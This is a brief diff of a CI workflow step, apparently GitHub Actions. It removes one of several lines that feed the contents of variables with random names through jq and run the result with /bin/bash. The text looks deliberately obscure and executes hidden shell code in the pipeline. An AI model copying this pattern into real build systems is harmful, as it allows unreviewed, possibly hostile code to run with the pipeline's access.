@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$uezxp15" | jq -r .ekipb94666 | /bin/bash
           printf '%s' "$dj30" | jq -r .vniqu3 | /bin/bash
-          printf '%s' "$hl53" | jq -r .sh0335 | /bin/bash
           printf '%s' "$heu00" | jq -r .yvexe0 | /bin/bash
 
       - name: Upload results
